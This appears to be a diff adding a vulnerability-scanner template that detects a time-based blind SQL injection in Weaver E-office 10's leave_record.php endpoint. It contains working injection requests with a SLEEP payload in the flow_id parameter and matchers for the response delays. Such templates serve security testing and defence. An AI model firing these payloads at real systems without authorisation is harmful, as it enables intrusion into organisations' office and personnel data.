@@ -1,0 +1,24 @@
+id: Weaver_E-Office10_leave_record_SQLi
+
+info:
+  name: 泛微E-office 10 leave_record.php接口SQL注入漏洞
+  author: Co5mos
+  severity: critical
+  tags: eoffice10, sqli, weaver
+
+http:
+  - raw:
+    - |
+      GET /eoffice10/server/ext/system_support/leave_record.php?flow_id=1%27+AND+%28SELECT+4196+FROM+%28SELECT%28SLEEP%283%29%29LWzs%29+AND+%27zfNf%27%3D%27zfNf&run_id=1&table_field=1&table_field_name=user()&max_rows=10 HTTP/1.1
+      Host: {{Hostname}}
+
+    - |
+      GET /eoffice10/server/ext/system_support/leave_record.php?flow_id=1%27+AND+%28SELECT+4196+FROM+%28SELECT%28SLEEP%286%29%29LWzs%29+AND+%27zfNf%27%3D%27zfNf&run_id=1&table_field=1&table_field_name=user()&max_rows=10 HTTP/1.1
+      Host: {{Hostname}}     
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration_1>=3 && duration_1<=5'
+          - 'duration_2>=6 && duration_2<=8'
+        condition: and
